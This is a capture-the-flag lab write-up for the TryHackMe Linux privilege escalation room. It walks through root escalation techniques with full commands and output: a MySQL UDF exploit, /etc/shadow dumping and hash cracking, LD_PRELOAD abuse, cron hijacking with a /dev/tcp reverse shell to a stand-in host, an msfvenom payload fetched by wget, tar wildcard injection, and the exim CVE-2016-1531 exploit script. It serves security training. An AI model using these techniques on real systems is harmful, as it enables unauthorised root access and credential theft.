# Room
https://tryhackme.com/room/linuxprivesc

# Task 1 - Deploy VM and connect with SSH
SSH to the server and then check group associations using the id command
* id
    ```
    user@debian:~$ id
    uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)    
    ```

# Task 2 - Service Exploits
When the MySQL service runs as root, there may be an exploit you can take advantage of that uses User Defined Functions.
* cd to the udf directory and compile the exploit code
    ```
    user@debian:~$ cd /home/user/tools/mysql-udf/
    user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
    user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    user@debian:~/tools/mysql-udf$ ls -lrta raptor*
    -rw-r--r-- 1 user user 3378 May 15  2020 raptor_udf2.c
    -rw-r--r-- 1 user user 5344 Jan 26 18:38 raptor_udf2.o
    -rwxr-xr-x 1 user user 8272 Jan 26 18:39 raptor_udf2.so

    https://www.exploit-db.com/exploits/1518
    ```
* connect to MySQL as the root user and create a User Defined Function
    ```
    user@debian:~/tools/mysql-udf$ mysql -u root
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 35
    Server version: 5.1.73-1+deb6u1 (Debian)

    Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    mysql> use mysql;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    mysql> create table foo(line blob);
    Query OK, 0 rows affected (0.00 sec)

    mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
    Query OK, 1 row affected (0.00 sec)

    mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    Query OK, 1 row affected (0.00 sec)

    mysql> create function do_system returns integer soname 'raptor_udf2.so';
    Query OK, 0 rows affected (0.00 sec)

    mysql> 
    ```
* use the function you just created to copy /bin/bash to a temp file and then give that file the SUID permission, finally jump into the shell and verify you are root
    ```
    mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
    +------------------------------------------------------------------+
    | do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
    +------------------------------------------------------------------+
    |                                                                0 |
    +------------------------------------------------------------------+
    1 row in set (0.01 sec)

    mysql> exit
    Bye
    user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
    rootbash-4.1# whoami
    root
    rootbash-4.1# 
    ```
* remove the file when you are finished
    ```
    mysql> select do_system('rm -rf /tmp/rootbash');
    +-----------------------------------+
    | do_system('rm -rf /tmp/rootbash') |
    +-----------------------------------+
    |                                 0 |
    +-----------------------------------+
    1 row in set (0.00 sec)

    mysql> exit
    Bye
    user@debian:/tmp$ ls -lrta /tmp/rootbash
    ls: cannot access /tmp/rootbash: No such file or directory
    ```
# Task 3 - Weak File Permissions - Readable /etc/shadow
/etc/shadow has password hashes, it is only readable by root
* check the /etc/shadow file to see if it is misconfigured and allows you to read it
    ```
    user@debian:~$ ls -lrta /etc/shadow
    -rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow

    user@debian:~$ cat /etc/shadow
    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
    daemon:*:17298:0:99999:7:::
    bin:*:17298:0:99999:7:::
    sys:*:17298:0:99999:7:::
    sync:*:17298:0:99999:7:::
    games:*:17298:0:99999:7:::
    man:*:17298:0:99999:7:::
    lp:*:17298:0:99999:7:::
    mail:*:17298:0:99999:7:::
    news:*:17298:0:99999:7:::
    uucp:*:17298:0:99999:7:::
    proxy:*:17298:0:99999:7:::
    www-data:*:17298:0:99999:7:::
    backup:*:17298:0:99999:7:::
    list:*:17298:0:99999:7:::
    irc:*:17298:0:99999:7:::
    gnats:*:17298:0:99999:7:::
    nobody:*:17298:0:99999:7:::
    libuuid:!:17298:0:99999:7:::
    Debian-exim:!:17298:0:99999:7:::
    sshd:*:17298:0:99999:7:::
    user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
    statd:*:17299:0:99999:7:::
    mysql:!:18133:0:99999:7:::
    ```
* crack root's hash with john
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt h1.txt                           

    Using default input encoding: UTF-8                                                                                                                                             
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])                                                                                                     
    Cost 1 (iteration count) is 5000 for all loaded hashes                                                                                                                          
    Will run 2 OpenMP threads                                                                                                                                                       
    Press 'q' or Ctrl-C to abort, almost any other key for status
    [removed]      (?)
    1g 0:00:00:01 DONE (2021-01-26 18:49) 0.7692g/s 1083p/s 1083c/s 1083C/s cuties..tagged
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
# Task 4 - Weak File Permissions - Writable /etc/shadow
If the /etc/shadow file is writeable, you can create a new password hash with a password of your choosing, and overwrite an existing one
* Generate a new password hash with mkpasswd
    ```
    user@debian:~$ mkpasswd -m sha-512 cool
    $6$SrDC5MGFC.3uMi$MW1nLHduoLKd1C85/5n0a85rZwKhcTQivbI.4/D.lSBZToHNjOFEmS0cVKnq54MOVrTj4/LEilbr2ACMJMAl60
    ```
* Edit the /etc/shadow file and replace root's password hash with the one you just created
    ```
    user@debian:~$ vim /etc/shadow
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#     
    ```
# Task 5 - Weak File Permissions - Writable /etc/passwd
If the /etc/passwd file is writable on some versions of Linux it will function in the same way as /etc/shadow
* Generate a new password hash with openssl
    ```
    user@debian:~$ openssl passwd nice
    bHIth8gtHu2OA    
    ```
* Edit the /etc/passwd file and place the hash in between the first and second colon for the root user
    ```
    user@debian:~$ vim /etc/passwd
    user@debian:~$ su root
    Password: 
    root@debian:/home/user# 
    ```
# Task 6 - Sudo - Shell Escape Sequences
You can use a combination of sudo -l and GTFOBins to find vulnerable applications to escalate privilege
* List sudo permissions
    ```
    user@debian:~$ sudo -l
    Matching Defaults entries for user on this host:
        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

    User user may run the following commands on this host:
        (root) NOPASSWD: /usr/sbin/iftop
        (root) NOPASSWD: /usr/bin/find
        (root) NOPASSWD: /usr/bin/nano
        (root) NOPASSWD: /usr/bin/vim
        (root) NOPASSWD: /usr/bin/man
        (root) NOPASSWD: /usr/bin/awk
        (root) NOPASSWD: /usr/bin/less
        (root) NOPASSWD: /usr/bin/ftp
        (root) NOPASSWD: /usr/bin/nmap
        (root) NOPASSWD: /usr/sbin/apache2
        (root) NOPASSWD: /bin/more
    ```
* Research these applications using GTFOBins
    ```
    https://gtfobins.github.io/
    ```
# Task 7 - Sudo - Environment Variables
Sudo can inherit environment variables
* Check which environment variables are inherited
    ```
    user@debian:~$ sudo -l
    Matching Defaults entries for user on this host:
        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH  <------

    User user may run the following commands on this host:
        (root) NOPASSWD: /usr/sbin/iftop
        (root) NOPASSWD: /usr/bin/find
        (root) NOPASSWD: /usr/bin/nano
        (root) NOPASSWD: /usr/bin/vim
        (root) NOPASSWD: /usr/bin/man
        (root) NOPASSWD: /usr/bin/awk
        (root) NOPASSWD: /usr/bin/less
        (root) NOPASSWD: /usr/bin/ftp
        (root) NOPASSWD: /usr/bin/nmap
        (root) NOPASSWD: /usr/sbin/apache2
        (root) NOPASSWD: /bin/more
    ```
* LD_PRELOAD loads a shared object before a program loads, LD_LIBRARY_PATH is a list of directories where shared libraries are searched first
* Create a shared object and then set the preload and run one of the available sudo commands from above, a root shell should spawn
    ```
    user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
    user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so less
    root@debian:/home/user# 
    ```
* Check shared libraries for apache2
    ```
    user@debian:~$ ldd /usr/sbin/apache2
            linux-vdso.so.1 =>  (0x00007fff8e645000)
            libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8896400000)
            libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f88961dc000)
            libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f8895fa2000)
            libpthread.so.0 => /lib/libpthread.so.0 (0x00007f8895d86000)
            libc.so.6 => /lib/libc.so.6 (0x00007f8895a1a000)
            libuuid.so.1 => /lib/libuuid.so.1 (0x00007f8895815000)
            librt.so.1 => /lib/librt.so.1 (0x00007f889560d000)
            libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f88953d6000)
            libdl.so.2 => /lib/libdl.so.2 (0x00007f88951d1000)
            libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f8894fa9000)
            /lib64/ld-linux-x86-64.so.2 (0x00007f88968bd000)
    ```
* Create a shared library with the same name as one listed above and then set the library path and run apache2 with sudo
    ```
    user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
    user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
    apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
    root@debian:/home/user# exit
    ```
# Task 8 - Cron Jobs - File Permissions
Cron jobs are liked scheduled tasks in Windows, they system wide schedule is located in /etc/crontab
* Look at the scheduled tasks
    ```
    user@debian:~$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    * * * * * root overwrite.sh
    * * * * * root /usr/local/bin/compress.sh
    ```
* Review the permissions of overwrite.sh which is run every minute by root
    ```
    user@debian:~$ locate overwrite.sh
    locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 257.5 days)
    /usr/local/bin/overwrite.sh
    user@debian:~$ ls -lrta /usr/local/bin/overwrite.sh 
    -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
    ```
* Since overwrite.sh is writable by anyone, you can make changes to it and the next time it executes it will be done so as if run by root
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...

    user@debian:~$ echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
    user@debian:~$ echo 'bash -i >& /dev/tcp/a.b.c.d/1234 0>&1' >> /usr/local/bin/overwrite.sh
    user@debian:~$     

    connect to [a.b.c.d] from (UNKNOWN) [10.10.73.156] 43907
    bash: no job control in this shell
    root@debian:~# whoami
    whoami
    root    
    ```
# Task 9 - Cron Jobs - PATH Environment Variable
Cron jobs are liked scheduled tasks in Windows, they system wide schedule is located in /etc/crontab
* View the system cron tab
    ```
    user@debian:~$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    * * * * * root overwrite.sh
    * * * * * root /usr/local/bin/compress.sh
    ```
* Note the path above starts with /home/user, this can be exploited
* Create a file called overwrite.sh in the home directory
    ```
    user@debian:~$ cd
    user@debian:~$ echo "#!/bin/bash" > overwrite.sh
    -bash: !/bin/bash": event not found
    user@debian:~$ echo '#!/bin/bash' > overwrite.sh
    user@debian:~$ echo 'cp /bin/bash /tmp/rootbash' >> overwrite.sh
    user@debian:~$ echo 'chmod +xs /tmp/rootbash' >> overwrite.sh
    user@debian:~$ ls -lrta overwrite.sh
    -rw-r--r-- 1 user user 64 Jan 29 09:32 overwrite.sh
    user@debian:~$ cat overwrite.sh
    #!/bin/bash
    cp /bin/bash /tmp/root/bash
    chmod +xs /tmp/rootbash
    user@debian:~$ 
    ```
* Make the file executable
    ```
    user@debian:~$ chmod +x overwrite.sh 
    user@debian:~$
    ```
* Wait for the cron job to run that creates /tmp/rootbash, then execute it
    ```
    user@debian:~$ /tmp/rootbash -p
    rootbash-4.1# whoami
    root
    ```
# Task 10 - Cron Jobs - Wildcards
Cron jobs are liked scheduled tasks in Windows, they system wide schedule is located in /etc/crontab
* View the compress.sh script
    ```
    user@debian:~$ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *
    ```
* The tar command is being executed with a wildcard, this can be exploited
* Reference GTFOBins for tar: https://gtfobins.github.io/gtfobins/tar/
* Create an ELF binary with msfvenom
    ```
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=a.b.c.d LPORT=1234 -f elf -o shell.elf
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 74 bytes
    Final size of elf file: 194 bytes
    Saved as: shell.elf
    ```
* Transfer the file
    ```
    sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

    user@debian:~$ wget http://a.b.c.d/shell.elf
    --2021-01-29 09:47:41--  http://a.b.c.d/shell.elf
    Connecting to a.b.c.d:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 194 [application/octet-stream]
    Saving to: “shell.elf”

    100%[===========================================================================================================================>] 194         --.-K/s   in 0s      

    2021-01-29 09:47:42 (44.1 MB/s) - “shell.elf” saved [194/194]

    user@debian:~$ ls -lrta shell.elf
    -rw-r--r-- 1 user user 194 Jan 29 09:39 shell.elf
    ```
* Set the file to executable
    ```
    user@debian:~$ chmod +x shell.elf
    user@debian:~$ 
    ```
* Create two files that are interpreted by tar as command line arguments when the compress.sh script is run, when tar sees them, they will be included in the tar command in the script
    ```
    user@debian:~$ touch /home/user/--checkpoint=1
    user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf

    user@debian:~$ ls
    --checkpoint=1  --checkpoint-action=exec=shell.elf  myvpn.ovpn  overwrite.sh  shell.elf  tools
    ```
* Create a listener and then wait for the cron to run, check the shell
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.10.141] 33241
    whoami
    root
    ```
# Task 11 - SUID / SGID Executables and known exploits
* SUID bit
    * user executes file with permissions of file owner
    ```
    rw-rw-rw-
      |
      |--- SUID bit
      |
    rwSrw-rw-
    ```
* SGID bit
    * user executes file with permissions of group owner
    ```
    rw-rw-rw-
         |
         |--- SGID bit
         |
    rw-rwSrw-    
    ```
* Searching for both SUID and SGID at the same time
    ```
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

    user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwsr-sr-x 1 root root 926536 Jan 29 10:26 /tmp/rootbash
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
    ```
* In the above output, /usr/sbin/exim-4.84-3 stands out as a non standard file with the SUID bit set, searching exploit-db.com comes up with this
    ```
    https://www.exploit-db.com/exploits/39535
    ```
* Download and run the exploit, a pre-staged example is here
    ```
    user@debian:~$ cat /home/user/tools/suid/exim/cve-2016-1531.sh 
    #!/bin/sh
    # CVE-2016-1531 exim <= 4.84-3 local root exploit
    # ===============================================
    # you can write files as root or force a perl module to
    # load by manipulating the perl environment and running
    # exim with the "perl_startup" arguement -ps. 
    #
    # e.g.
    # [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
    # [ CVE-2016-1531 local root exploit
    # sh-4.3# id
    # uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
    # 
    # -- Hacker Fantastic 
    echo [ CVE-2016-1531 local root exploit
    cat > /tmp/root.pm << EOF
    package root;
    use strict;
    use warnings;

    system("/bin/sh");
    EOF
    PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
    ```
* Run the exploit
    ```
    user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh 
    [ CVE-2016-1531 local root exploit
    sh-4.1# whoami
    root
    sh-4.1# 
    ```
# Task 12 - SUID / SGID Executables - Shared Object Injection
/usr/local/bin/suid-so is vulnerable to shared object injection
* Run the file
    ```
    user@debian:~$ /usr/local/bin/suid-so
    Calculating something, please wait...
    [=====================================================================>] 99 %
    Done.
    ```
* Use strace to find open/access calls
    ```
    user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    open("/etc/ld.so.cache", O_RDONLY)      = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libdl.so.2", O_RDONLY)       = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libm.so.6", O_RDONLY)        = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libc.so.6", O_RDONLY)        = 3
    open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
    user@debian:~$ 
    ```
* From the above, suid-so tries to load /home/user/.config/libcalc.so in a directory we own, create the .config directory
    ```
    user@debian:~$ mkdir /home/user/.config        
    ```
* Copy example code and compile it
    ```
    user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
    user@debian:~$ ls -lrta /home/user/.config
    total 16
    drwxr-xr-x 6 user user 4096 Jan 29 10:43 ..
    -rwxr-xr-x 1 user user 6134 Jan 29 10:43 libcalc.so
    drwxr-xr-x 2 user user 4096 Jan 29 10:43 .
    ```
* Run suid-so again for a shell
    ```
    user@debian:~$ /usr/local/bin/suid-so
    Calculating something, please wait...
    bash-4.1# whoami
    root
    bash-4.1# 
    ```
# Task 13 - SUID / SGID Executables - Environment Variables
suid-env can be exploited with the user's PATH environment variable
* Check suid-env
    ```
    user@debian:~$ /usr/local/bin/suid-env
    Starting web server: apache2httpd (pid 1717) already running
    .
    ```
* Check suid-env with strings
    ```
    user@debian:~$ strings /usr/local/bin/suid-env
    /lib64/ld-linux-x86-64.so.2
    5q;Xq
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    service apache2 start
    ```
* /usr/local/bin/suid-env runs "service apache2 start" without a full path to the binary, this can be exploited, compile the example code
    ```
    user@debian:~$ gcc -o service /home/user/tools/suid/service.c
    ```
* Prepend the current directory to the PATH envionrment variable and run suid-env again
    ```
    user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
    root@debian:~# echo $PATH
    .:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin

    root@debian:~# whoami
    root
    ```
# Task 14 - SUID / SGID Executables - Abusing Shell Features
In Bash versions < 4.2-048 you can create shell functions with names that look like file paths and export those functions so they are used instead of an executable file path
* Check example with strings
    ```
    user@debian:~$ strings /usr/local/bin/suid-env2
    /lib64/ld-linux-x86-64.so.2
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    /usr/sbin/service apache2 start
    ```
* Check Bash version
    ```
    /usr/sbin/service apache2 start
    user@debian:~$ /bin/bash --version
    GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
    Copyright (C) 2009 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

    This is free software; you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    ```
* Create Bash function with /usr/sbin/service in the name that executes bash and then export it
    ```
    user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
    user@debian:~$ export -f /usr/sbin/service
    user@debian:~$    

    user@debian:~$ env | tail -3
    /usr/sbin/service=() {  /bin/bash -p
    }
    _=/usr/bin/env    
    ```
* Run the example program again
    ```
    user@debian:~$ /usr/local/bin/suid-env2
    root@debian:~# whoami
    root
    ```
